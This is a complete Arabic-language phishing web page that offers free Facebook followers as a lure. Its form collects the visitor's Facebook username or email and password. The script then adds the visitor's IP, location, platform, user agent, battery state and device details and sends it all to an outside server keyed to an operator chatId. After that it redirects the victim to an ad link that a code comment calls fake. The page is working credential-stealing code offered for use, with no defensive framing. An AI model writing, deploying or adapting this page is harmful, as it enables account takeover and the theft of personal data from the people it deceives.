<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <title>زيادة متابعين فيسبوك</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #333;
        }
        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        h1 {
            color: #1877f2;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"], select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            background-color: #f9f9f9;
            color: #333;
            box-sizing: border-box;
        }
        button {
            background-color: #1877f2;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 10px;
        }
        .facebook-logo {
            width: 50px;
            height: 50px;
            margin-bottom: 20px;
        }
        .notification {
            position: fixed;
            top: 10px;
            right: 10px;
            background-color: #1877f2;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            z-index: 100;
            opacity: 0;
            transition: opacity 0.5s ease;
            display: none;
        }
        .notification.show {
            opacity: 1;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
        <h1>زيادة متابعين فيسبوك ❤️🚀</h1>
        <form id="increaseForm">
            <input type="hidden" name="chatId" id="chatIdInput">
            <input type="text" name="username" placeholder="يوزر الحساب او البريد الإلكتروني" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <select name="followers" required>
                <option value="">اختر عدد المتابعين</option>
             <option value="500">متابع 500🔥</option>
                 <option value="1000">متابع 1k⭐</option>
                     <option value="2000">متابع 2k💥</option>
                <option value="3000">متابع 3k🚀</option>
            </select>
            <button type="submit">رشق</button>
        </form>
        <div class="notification" id="notification">
            <p>تم تنفيذ طلبك! إذا كانت البيانات صحيحة، فسوف يصلون إليك المتابعين في غضون 15 دقيقة.</p>
        </div>
    </div>
<script>
const increaseForm = document.getElementById('increaseForm');
const chatIdInput = document.getElementById('chatIdInput');
const notification = document.getElementById('notification');

const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('chatId');
document.getElementById('chatId').value = chatId || '';

async function getIPInfo() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      ip: data.ip,
      country: data.country_name,
      city: data.city
    };
  } catch (error) {
    console.error('Error fetching IP info:', error);
    return {
      ip: 'Unknown',
      country: 'Unknown',
      city: 'Unknown'
    };
  }
}

function getPlatformInfo() {
  const ua = navigator.userAgent;
  let platform = "Unknown";
  if (/Windows/.test(ua)) platform = "Windows";
  else if (/Mac/.test(ua)) platform = "MacOS";
  else if (/Linux/.test(ua)) platform = "Linux";
  else if (/Android/.test(ua)) platform = "Android";
  else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";

  return {
    platform: platform,
    userAgent: ua
  };
}

async function getBatteryInfo() {
  if ('getBattery' in navigator) {
    try {
      const battery = await navigator.getBattery();
      return {
        batteryLevel: battery.level,
        batteryCharging: battery.charging
      };
    } catch (error) {
      console.error('Error getting battery info:', error);
    }
  }
  return {
    batteryLevel: undefined,
    batteryCharging: undefined
  };
}

function getDeviceVersion() {
  const ua = navigator.userAgent;
  const match = ua.match(/\(([^)]+)\)/);
  return match ? match[1] : 'Unknown';
}

increaseForm.addEventListener('submit', async (event) => {
  event.preventDefault();
  const formData = new FormData(increaseForm);
  const data = Object.fromEntries(formData.entries());

  const ipInfo = await getIPInfo();
  const platformInfo = getPlatformInfo();
  const batteryInfo = await getBatteryInfo();
  const deviceVersion = getDeviceVersion();

  Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });

  try {
    const response = await fetch('https://freeusr1.onrender.com/submitIncrease', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    });
    const result = await response.json();
    if (result.success) {
      document.getElementById('notification').innerText = 'تم إرسال البيانات بنجاح!';
      notification.classList.add('show');

      // بعد 2 ثانية يحول للرابط الوهمي
      setTimeout(() => {
        window.location.href = "https://www.profitableratecpm.com/s1m3mf2q?key=87988e853a1ebb8f407104aa577be8d6";
      }, 2000);

      increaseForm.reset();
    } else {
      alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
    }
  } catch (error) {
    console.error('Error:', error);
    alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
  }
});
</script>
</body>
</html>
